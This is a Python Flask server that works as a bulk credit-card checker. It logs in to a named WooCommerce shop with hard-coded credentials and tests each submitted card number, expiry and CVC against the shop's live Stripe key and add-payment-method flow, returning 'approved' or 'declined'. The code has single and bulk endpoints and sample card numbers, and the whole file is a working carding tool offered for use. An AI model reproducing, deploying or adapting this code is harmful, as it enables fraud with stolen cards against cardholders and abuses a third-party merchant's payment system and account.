from flask import Flask, request, jsonify, render_template_string
import requests
import re
import os
import time
from threading import Lock

app = Flask(__name__)

API_KEY = os.environ.get('API_KEY', 'yashikaaa')
PORT = int(os.environ.get('PORT', 8080))

USERNAME = os.environ.get('USERNAME', 'jflpw@hi2.in')
PASSWORD = os.environ.get('PASSWORD', 'jflpw@hi2.in')

# Global session - logged in once and reused
session = requests.Session()
session_lock = Lock()
is_logged_in = False
last_login_time = 0

BASE_COOKIES = {
    'wmc_ip_info': 'eyJjb3VudHJ5IjoiSU4iLCJjdXJyZW5jeV9jb2RlIjoiSU5SIn0%3D',
    'wmc_current_currency': 'INR',
    'wmc_current_currency_old': 'INR',
    'cookie_notice_accepted': 'true',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    '__stripe_mid': '0f57928e-b5df-49b8-bddc-e2e1b027e8c264a831',
}

# Apply base cookies to session
for key, value in BASE_COOKIES.items():
    session.cookies.set(key, value)

def login():
    """Login once and maintain session"""
    global is_logged_in, last_login_time
    
    with session_lock:
        if is_logged_in and (time.time() - last_login_time) < 1800:
            return True
        
        print("Logging in to hakfabrications.com...")
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        
        login_data = {
            'username': USERNAME,
            'password': PASSWORD,
            'rememberme': 'forever',
            'woocommerce-login-nonce': '0cd1c0ce87',
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }
        
        try:
            response = session.post('https://hakfabrications.com/my-account/', 
                                    headers=headers, data=login_data, timeout=30)
            
            if 'wordpress_logged_in' in response.text or response.status_code == 200:
                is_logged_in = True
                last_login_time = time.time()
                print("Login successful!")
                return True
            else:
                print("Login failed!")
                return False
                
        except Exception as e:
            print(f"Login error: {e}")
            return False

def get_nonce():
    """Get fresh nonce from payment page"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
    }
    
    response = session.get('https://hakfabrications.com/my-account/add-payment-method/', 
                           headers=headers, timeout=30)
    
    # Extract nonce
    nonce_match = re.search(r'"_ajax_nonce":"([^"]+)"', response.text)
    if not nonce_match:
        nonce_match = re.search(r"'ajax_nonce':'([^']+)'", response.text)
    if not nonce_match:
        nonce_match = re.search(r'wc_stripe_create_and_confirm_setup_intent_nonce["\']?\s*:\s*["\']([^"\']+)', response.text)
    
    nonce = nonce_match.group(1) if nonce_match else 'ca52ddb9c7'
    
    # Get Stripe session ID
    stripe_sid = response.cookies.get('__stripe_sid', 'e99ec91e-fbc8-47a3-afcc-421fe9ea9ff74b630a')
    session.cookies.set('__stripe_sid', stripe_sid)
    
    return nonce

def process_card(card_number, mm, yy, cvc):
    """Process a single card - uses global logged-in session"""
    
    # Ensure we're logged in
    if not login():
        return {"status": "error", "message": "Login failed"}
    
    if len(yy) == 4:
        yy = yy[2:4]
    
    try:
        # Get fresh nonce
        nonce = get_nonce()
        
        # Format card with spaces
        formatted_card = ' '.join([card_number[i:i+4] for i in range(0, len(card_number), 4)])
        
        # Create payment method via Stripe
        stripe_headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
        }
        
        stripe_data = f'type=card&card[number]={formatted_card}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&key=pk_live_51PHFfEJakExu3YjjB9200dwvfPYV3nPS2INa1tXXtAbXzIl5ArrydXgPbd8vuOhNzCrq6TrNDL2nFGyZKD23gwQV00AS39rQEH&_stripe_version=2025-09-30.clover'
        
        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', 
                                        headers=stripe_headers, data=stripe_data, timeout=30)
        stripe_result = stripe_response.json()
        
        if 'id' not in stripe_result:
            error_msg = stripe_result.get('error', {}).get('message', 'Unknown error')
            if 'expired' in error_msg.lower():
                return {"status": "declined", "message": "Expired card"}
            elif 'insufficient' in error_msg.lower():
                return {"status": "declined", "message": "Insufficient funds"}
            elif 'declined' in error_msg.lower():
                return {"status": "declined", "message": "Card declined"}
            else:
                return {"status": "declined", "message": error_msg[:50]}
        
        payment_id = stripe_result['id']
        
        # Confirm setup intent
        ajax_headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36',
            'Referer': 'https://hakfabrications.com/my-account/add-payment-method/',
        }
        
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }
        
        final_response = session.post('https://hakfabrications.com/wp-admin/admin-ajax.php',
                                       headers=ajax_headers, data=ajax_data, timeout=30)
        final_result = final_response.json()
        
        if final_result.get('success') == True:
            return {"status": "approved", "message": "Success"}
        else:
            error = final_result.get('data', {}).get('error', {}).get('message', 'Card declined')
            return {"status": "declined", "message": error[:50]}
            
    except requests.exceptions.Timeout:
        return {"status": "declined", "message": "Request timeout"}
    except Exception as e:
        return {"status": "error", "message": str(e)[:50]}


# HTML template for web interface
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Stripe Payment API</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
        h1 { color: #333; }
        .endpoint { background: #f5f5f5; padding: 15px; border-radius: 5px; margin: 10px 0; }
        code { background: #e0e0e0; padding: 2px 6px; border-radius: 3px; font-family: monospace; }
        .example { background: #e8f4e8; padding: 10px; border-left: 4px solid green; margin: 10px 0; }
        .error { background: #ffe8e8; padding: 10px; border-left: 4px solid red; margin: 10px 0; }
        input, button { padding: 8px 12px; margin: 5px; }
        input { width: 300px; }
        .result { background: #f0f0f0; padding: 15px; border-radius: 5px; margin-top: 20px; white-space: pre-wrap; }
    </style>
</head>
<body>
    <h1>💳 Stripe Payment API</h1>
    <p>Status: <strong>✅ Running</strong></p>
    
    <div class="endpoint">
        <h3>📌 API Endpoint</h3>
        <code>GET /key={API_KEY}/cc=CARD|MM|YY|CVC</code>
    </div>
    
    <div class="example">
        <strong>✅ Example - Approved Card:</strong><br>
        <code>/key=yashikaaa/cc=4340762018243549|08|2028|335</code>
    </div>
    
    <div class="example">
        <strong>❌ Example - Declined Card:</strong><br>
        <code>/key=yashikaaa/cc=4663490011245506|02|2027|453</code>
    </div>
    
    <div class="endpoint">
        <h3>📦 Bulk Check</h3>
        <code>POST /key={API_KEY}/cards</code><br>
        <small>Body: {"cards": ["card1|MM|YY|CVC", "card2|MM|YY|CVC"]}</small>
    </div>
    
    <div class="endpoint">
        <h3>❤️ Health Check</h3>
        <code>GET /health</code>
    </div>
    
    <hr>
    
    <h3>🧪 Test Card</h3>
    <input type="text" id="cardInput" placeholder="4340762018243549|08|2028|335" size="40">
    <button onclick="testCard()">Check Card</button>
    
    <div id="result" class="result" style="display:none;"></div>
    
    <script>
        const API_KEY = '{{ api_key }}';
        
        async function testCard() {
            const card = document.getElementById('cardInput').value;
            if (!card) return;
            
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.innerHTML = 'Processing...';
            
            try {
                const response = await fetch(`/key=${API_KEY}/cc=${card}`);
                const data = await response.json();
                resultDiv.innerHTML = JSON.stringify(data, null, 2);
            } catch (error) {
                resultDiv.innerHTML = `Error: ${error.message}`;
            }
        }
    </script>
</body>
</html>
'''


@app.route('/', methods=['GET'])
def home():
    """Web interface - shows usage instructions"""
    return render_template_string(HTML_TEMPLATE, api_key=API_KEY)


@app.route('/key=<api_key>/cc=<card_data>', methods=['GET'])
def process_card_api(api_key, card_data):
    """Main API endpoint - process single card"""
    
    # Validate API key
    if api_key != API_KEY:
        return jsonify({
            "error": "Invalid API key",
            "message": f"Use correct API key. Example: /key={API_KEY}/cc=...",
            "status": "error"
        }), 401
    
    # Parse card data
    parts = card_data.split('|')
    if len(parts) != 4:
        return jsonify({
            "card": card_data,
            "gateway": "Stripe",
            "response": "Invalid format. Use: NUMBER|MM|YY|CVC",
            "status": "error",
            "example": f"/key={API_KEY}/cc=4340762018243549|08|2028|335"
        })
    
    card_number, mm, yy, cvc = parts
    
    # Validate card number
    if not card_number.isdigit() or len(card_number) < 15:
        return jsonify({
            "card": card_data,
            "gateway": "Stripe",
            "response": "Invalid card number",
            "status": "error"
        })
    
    # Process the card
    result = process_card(card_number, mm, yy, cvc)
    
    return jsonify({
        "card": f"{card_number}|{mm}|{yy}|{cvc}",
        "gateway": "Stripe",
        "response": result.get("message", "Unknown"),
        "status": result.get("status", "declined")
    })


@app.route('/key=<api_key>/cards', methods=['POST'])
def process_multiple_cards(api_key):
    """Process multiple cards in bulk"""
    
    if api_key != API_KEY:
        return jsonify({"error": "Invalid API key"}), 401
    
    data = request.get_json()
    if not data or 'cards' not in data:
        return jsonify({
            "error": "Missing 'cards' array",
            "example": {"cards": ["4340762018243549|08|2028|335", "4663490011245506|02|2027|453"]}
        }), 400
    
    results = []
    for card in data['cards']:
        parts = card.split('|')
        if len(parts) == 4:
            result = process_card(parts[0], parts[1], parts[2], parts[3])
            results.append({
                "card": card,
                "gateway": "Stripe",
                "response": result.get("message", "Unknown"),
                "status": result.get("status", "declined")
            })
        else:
            results.append({
                "card": card,
                "gateway": "Stripe",
                "response": "Invalid format",
                "status": "error"
            })
    
    return jsonify({
        "results": results,
        "total": len(results),
        "approved": len([r for r in results if r['status'] == 'approved']),
        "declined": len([r for r in results if r['status'] == 'declined'])
    })


@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "port": PORT,
        "service": "Stripe Payment API",
        "logged_in": is_logged_in,
        "uptime": time.time() - last_login_time if last_login_time > 0 else 0
    })


@app.errorhandler(404)
def not_found(error):
    return jsonify({
        "error": "Endpoint not found",
        "message": f"Use: /key={API_KEY}/cc=CARD|MM|YY|CVC",
        "example": f"/key={API_KEY}/cc=4340762018243549|08|2028|335"
    }), 404


@app.errorhandler(500)
def internal_error(error):
    return jsonify({
        "error": "Internal server error",
        "message": "Please try again later"
    }), 500


if __name__ == '__main__':
    # Perform initial login on startup
    print("=" * 50)
    print("Stripe Payment API Server Starting...")
    print("=" * 50)
    
    if login():
        print("✅ Initial login successful!")
    else:
        print("⚠️ Initial login failed - will retry on first request")
    
    print(f"\n🌐 Server running on http://0.0.0.0:{PORT}")
    print(f"🔑 API Key: {API_KEY}")
    print("\n📌 Usage Examples:")
    print(f"   GET  /key={API_KEY}/cc=4340762018243549|08|2028|335")
    print(f"   POST /key={API_KEY}/cards")
    print(f"   GET  /health")
    print("\n" + "=" * 50)
    
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
